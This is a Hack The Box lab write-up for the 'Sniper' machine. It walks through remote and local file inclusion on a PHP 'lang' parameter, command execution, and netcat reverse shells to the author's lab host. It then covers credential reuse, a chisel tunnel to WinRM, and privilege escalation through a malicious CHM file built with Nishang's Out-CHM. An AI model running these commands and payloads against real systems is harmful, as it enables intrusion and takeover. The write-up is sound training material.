---
layout: post
title:  "Sniper Writeup - Hack The Box"
date:   2025-07-21
desc: ""
keywords: "HTB,OSCP,eWPT,Windows,LFI,RFI,Information Leakage,ScriptBlock,Creating malicious CHM File,Medium"
categories: [HTB]
tags: [HTB,OSCP,eWPT,Windows,LFI,RFI,Information Leakage,ScriptBlock,Creating malicious CHM File,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The **Sniper** machine took me to a new level of fun, as I was coming from a series of **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines with many technical concepts, which I also loved, and with this box I could work on my **lateral thinking**, as well as reinstalling and configuring virtual machines. The community rated the machine as **Medium** and I think I agree with this valuation (although many times I have my own rating) because the exploitation of vulnerabilities are very creative and even need some tools from **Linux** and others from the community. I login to my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account to spawn the machine to start my writeup.

<br /><br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm ready to start this nice **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab, so I'm going to check with `ping` that the connectivity is established and with the `whichSystem.py` tool (developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community) I have a high degree of certainty that the **OS** of the machine is **Windows**. Now I can start my **Reconnaissance** phase, and the first thing I do is to list with `nmap` all the open ports on the target, also with the custom scripts of this great tool I can also know the services and their versions available on each port found. On this machine I don't succeed in leaking much information, but with `crackmapexec` I succeed in getting some more **OS** data besides knowing the **SMB** protocol is not signed and can be susceptible to a **[SMB Relay Attack](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**. With `smbclient` and `smbmap` I can't enumerate shares as I don't have valid credentials, and if I try to attack the **RCP** with `rpcclient` I can't access without authentication. The other protocol, which also always presents a large attack surface, is the **HTTP** available on port **80**, so with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I disclose the technology stack behind the application, from which I also get its versions (The **JQuery** version may be vulnerable to **[Prototype Pollution](https://snyk.io/test/npm/jquery/2.1.3){:target="_blank"}**).

> **[Prototype Pollution](https://snyk.io/test/npm/jquery/2.1.3){:target="_blank"}**: The extend function can be tricked into modifying the prototype of Object when the attacker controls part of the structure passed to this function. This can let an attacker add or modify an existing property that will then exist on all objects.

```bash
ping -c 2 10.10.10.151
whichSystem.py 10.10.10.151
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.151 -oG allPorts
nmap -sCV -p80,135,139,445,49667 10.10.10.151 -oN targeted
cat targeted
#   -->  Microsoft IIS

crackmapexec smb 10.10.10.151
# Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)

smbclient -L 10.10.10.151 -N
smbmap -H 10.10.10.151 -u 'null' --no-banner
rpcclient -U "" 10.10.10.151 -N
whatweb http://10.10.10.151
# JQuery[2.1.3], Microsoft-IIS[10.0], PHP[7.3.1]
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the web application there is an authentication panel that seems to be immune to the most common attacks such as **SQLi** or the use of **default credentials**, it should be clarified that the attacks are test and I will not yet employ more complex methods because I will look for other routes to find attack vectors. With **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I do not find more interesting information about the technology stack, but I do notice when hovering on one of the links, the method used to access new web resources (related to the **language**), which is done through the **URL** and the use of the **lang** parameter. With my first tests and using **[typical Windows system files](https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40){:target="_blank"}**, I verify that the system is vulnerable to **[Local File Inclusion](https://www.armosec.io/glossary/local-file-inclusion/){:target="_blank"}**. If I start a local **SMB** server with `impacket-smbserver` I also observe that the machine is vulnerable to **[Remote file inclusion](https://www.invicti.com/learn/remote-file-inclusion-rfi/){:target="_blank"}** and even more important, is that if I include files with **PHP** code, it is **correctly interpreted** by the server.

> **[Local File Inclusion](https://www.armosec.io/glossary/local-file-inclusion/){:target="_blank"}** (**LFI**) is a type of vulnerability that occurs when a web application allows an attacker to include and execute local files on a server. This vulnerability arises due to **improper input validation** and **lack of proper security mechanisms** in web applications.

> **[Remote file inclusion](https://www.invicti.com/learn/remote-file-inclusion-rfi/){:target="_blank"}** (**RFI**) is a web vulnerability that lets a malicious hacker force the application to include arbitrary code files imported from another location, for example, a server controlled by the attacker.

```bash
# http://10.10.10.151/user/login.php
# admin, admin' or 1=1-- -      :(

# http://10.10.10.151/blog/?lang=\Windows\System32\drivers\etc\hosts
# view-source:http://10.10.10.151/blog/?lang=\Windows\System32\drivers\etc\hosts
# view-source:http://10.10.10.151/blog/?lang=\apache\php\php.ini
# view-source:http://10.10.10.151/blog/?lang=\WINDOWS\php.ini
# view-source:http://10.10.10.151/blog/?lang=\WINDOWS\win.ini

python3 -m http.server 80
# http://10.10.10.151/blog/?lang=http://10.10.14.9/
# :(

impacket-smbserver smbFolder $(pwd) -smb2support
# http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test

echo "<?php echo 'oldboy was here'; ?>" > test.php
cat !$
impacket-smbserver smbFolder $(pwd) -smb2support

view-source:http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test.php
# :)
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something I found strange about the **RFI** attack, is that usually when I start an **SMB server** I usually get the **NTLMv2 Hash** from the connecting **Windows user**, but on this machine `impacket-smbserver` did **not succeed in catching it**. Now that I can upload malicious **PHP** code I intend to turn it into an **RCE**, so first I will create a malicious file whose code allows me to execute commands through the **shell_exec** function and the use of the global super variable **```$_REQUEST```**. The first thing I successfully manage to do is to send a `ping` trace which I catch with `tcpdump` on my attacking machine. I can now start enumerating the system and leak information, although I still don't have access to the contents of the first flag. My next step is to access the system, so I'm going to look for `nc.exe` on my system, to make it accessible from the **SMB server** started with `impacket-smbserver` and finally run the command indicated to capture the incoming **Reverse Shell** with `nc` on port **443**.

```bash
echo "<?php system('ping -n 2 10.10.14.9'); ?>" > test.php
tcpdump -i tun0 icmp -n
# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test.php
# :)

# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test.php&cmd=whoami
# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test.php&cmd=dir C:\Users
# :(
# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test.php&cmd=type C:\Users\Chris\Desktop\user.txt
# :(

# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.19\smbFolder\test.php
# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.19\smbFolder\cmd.php
# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.19\smbFolder\old_b0y.php&cmd=dir

locate nc.exe | grep -v al3j0
cp /usr/share/windows-resources/binaries/nc.exe .
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap -cAr nc -nlvp 443
# view-source:http://10.10.10.151/blog/?lang=\\10.10.14.9\smbFolder\test.php&cmd=\\10.10.14.9\smbFolder\nc.exe%20-e%20cmd%2010.10.14.9%20443
# :)
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The first thing I find in the system is a **Database configuration** file with credentials that I'm going to write down that will most likely be useful for later. With the first enumeration commands, I find no privileges that allow me to **Escalate privileges**, system information (**OS version**, **64bit architecture**), but I still can't access the first flag (which with the **LFI** I had previously tried). With `crackmapexec` I validate that the password I found corresponds to **Chris's account** (**reusing passwords** is a bad practice that is still used) and also with `netstat` I find that the **WinRM** service is open but locally. If I leak information of the **chris** account I notice that it belongs to the **Remote Management User** group which would allow me to connect remotely with `evil-winrm`, in case the **WinRM** protocol was available.

> **Victime Machine**:

```cmd
type C:\inetpub\wwwroot\user\db.php
# DB Credentials
whoami /priv
whoami /all
net user
systemInfo
# x64-based PC
cd Chris
# Access is denied.
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.151 -u 'Chris' -p '36...VM'
```

> **Victime Machine**:

```cmd
netstat -ano
net user chris
# Local Group Memberships      *Remote Management Use
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The problem of not being able to access via **WinRM** can be solved with **[chisel](https://github.com/jpillora/chisel){:target="_blank"}**, creating a tunnel to port **5985**. So I download the project from **Github** to compile the `chisel` binary with `go` and compress it with `upx` to start a local server, I will also download the `chisel.exe` binary (**deprecated version**) to transfer it to the attacking machine, and before starting the program in client mode, I check the integrity of the file with `certutil`. Now that I have everything I need, I raise the tunnel and with `lsof` I check that the port **5985** of my attacking machine corresponds to `chisel`. Finally I can connect with `evil-winrm` using the credentials of the **chris** account and access the content of the first flag.

> **Attacker Machine**:

```bash
git clone https://github.com/jpillora/chisel
go build -ldflags '-s -w' .
du -hc chisel
upx chisel &>/dev/null
du -hc chisel
./chisel
# :)

mv /home/al3j0/Downloads/chisel_1.7.6_windows_amd64.gz ./chisel.exe.gz
gunzip chisel.exe.gz
md5sum chisel.exe
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.9\smbFolder\chisel.exe .\chisel.exe
# :(
```

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
powershell -c 'iwr -uri http://10.10.14.9/chisel.exe -OutFile .\chisel.exe'
certutil.exe -urlcache -f -split http://10.10.14.9/chisel.exe
certutil -hashfile .\chisel.exe MD5
# :)
```

> **Attacker Machine**:

```bash
./chisel server --reverse --port 1234
```

> **Victime Machine**:

```cmd
.\chisel.exe client 10.10.14.9:1234 R:5985:127.0.0.1:5985
```

> **Attacker Machine**:

```bash
lsof -i:5985
crackmapexec winrm 127.0.0.1 -u 'chris' -p '36...VM' 2>/dev/null
# :)
evil-winrm -i 127.0.0.1 -u 'chris' -p '36...VM'
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
whoami /priv
whoami /all
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to migrate to a **CMD** shell, before continuing the lab **Engagement**, because the **PowerShell** is running very slowly. With the new account compromised, I perform a new system enumeration and find a very suspicious folder in the root of the filesystem. In the aforementioned folder I find two files, in the contents of one of which is a **call for attention** to the PHP skills of a developer and the other is a **clear joke** on the same. The most interesting thing is that it seems to be running a scheduled task because the developer is asked to upload documentation to this folder. I run a test and upload a test **.php** file, wait a while to see if it gets deleted or modified but nothing happens. In the **Downloads** directory I find a clue, there is a **.chm** file that may be the vector for **Escalate Privileges**.

> A **.chm file** is a **Microsoft Compiled HTML Help file**, commonly used for software documentation or **ebooks**. It's a proprietary format that packages **HTML pages**, **images**, **JavaScript**, and other navigation tools (like tables of contents and indexes) into a **single compressed file**.

> **Attacker Machine**:

```bash
evil-winrm -i 127.0.0.1 -u 'chris' -p '36...VM' cmd
```

> **Victime Machine**:

```cmd
type note.txt
upload test.php

cd C:\Users\Chris\Downloads
type instructions.chm
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Maybe the attack vector is to **upload a malicious file in CHM format**, so I search in **Github** for a repository that allows me to create one, and after some research I find the **[nasbench PoC](https://gist.github.com/nasbench/953c5d34d720c50587e9948ee6d4f1b5){:target="_blank"}** based on the attacks performed by the **[North-Corean APT37](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37){:target="_blank"}**. I will need a **Windows virtual machine** to create my malicious file, then I just need to follow the instructions given in the **README.txt** of the repository. I must install **[HTML Help Workshop](https://web.archive.org/web/20200614044818if_/http://download.microsoft.com/download/0/a/9/0a939ef6-e31c-430f-a3df-dfae7960d564/htmlhelp.exe){:target="_blank"}** because I will need the `hhc.exe` binary, I also need to download the **[`Out-CHM.ps1` script](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1){:target="_blank"}** (after disabling some **Windows Firewall protection features**). Finally I can generate the file, with the payload I want, in this case I'm going to send a **Reverse Shell** to my attacker machine with `nc.exe`. I am going to create two files just in case, with different paths of `nc.exe`, many times I had permissions problems in different Windows paths.

> **[APT37](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37){:target="_blank"}** is a **North Korea-based advanced persistent threat actor** which primarily targets individuals in **South Korean organizations**.

> **[`Out-CHM.ps1` script](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1){:target="_blank"}**: The script generates a **CHM file** which needs to be sent to a target. You must have `hhc.exe` (**HTML Help Workshop**) on your machine to use this script. **HTML Help Workshop** is a free Microsoft Tool.

```bash
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1')

Out-CHM -Payload "C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.9 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
Out-CHM -Payload "C:\Users\Chris\Desktop\nc.exe -e cmd 10.10.14.9 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
# --> doc.chm         :)
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The last thing I need to do is to transfer `nc.exe` to the path of the victim machine defined in the **malicious payload**, in my first attempt I will upload `nc.exe` to the **Desktop** folder of **chris** and if problems arise I will try other paths. I also transfer the malicious **doc.chm** file from the **Windows virtual machine** I set up for this lab, first to my attacking machine, then I set up everything necessary to capture the incoming **Reverse Shell** with `nc` on port **443** of my machine and finally I transfer **doc.chm** to the target. After a short time of waiting I get the connection and I can access the content of the last flag, finally **pwned machine**.

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username oldboy -password oldboy123
```
> **Victime Machine**:

```cmd
net use x: \\10.10.14.9\smbFolder /u:oldboy oldboy123
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFold $(pwd) -smb2support -username oldboy -password oldboy123
```

> **Victime Machine**:

```cmd
net use x: \\10.10.14.9\smbFold /u:oldboy oldboy123
copy x:\nc.exe .\nc.exe
```

> **Virtual Machine**:

```cmd
python -m http.server 80
```

> **Attacker Machine**:

```bash
wget http://192.168.1.8/doc.chm

rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
cd C:\Docs
copy x:\doc.chm .\doc.chm
# :)

whoami
hostname
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

A pending account that I have left is to solve the problem with the **NTLMv2 hash** that I could not catch with `impacket-sembserver` and it is also a tip that I can use in other machines or in real environments. The solution that was recommended to me from the community is to start the **SMB daemon**, `smbd`, in my attacking machine and **[give full permissions to the share](https://www.linuxquestions.org/questions/linux-server-73/samba-net-usershare-command-and-requesting-an-example-from-smb-conf-696012/){:target="_blank"}** that I start with `impacket-smbserver`, besides allowing access to **guest** accounts, this way I will be able to catch the hashes of those accounts that try to connect.

```bash
systemctl status smbd
systemctl start smbd
systemctl status smbd
lsof -i:445

net usershare add smbFolder $(pwd) '' 'Everyone:f' 'guest_ok=y'
```

<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab that leaves me with **many lessons** and a **huge satisfaction** of task accomplished, as well as a variety of new concepts learned. I had a lot of fun, although there were moments of **impasse** and **frustration**, which **I'm gradually managing better**. It's time to go for my next goal, so I'm going to signin into my account to kill the box and continue on my way to becoming a better professional in this field.

<br /><br />
<img src="{{ site.img_path }}/sniper_writeup/Sniper_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
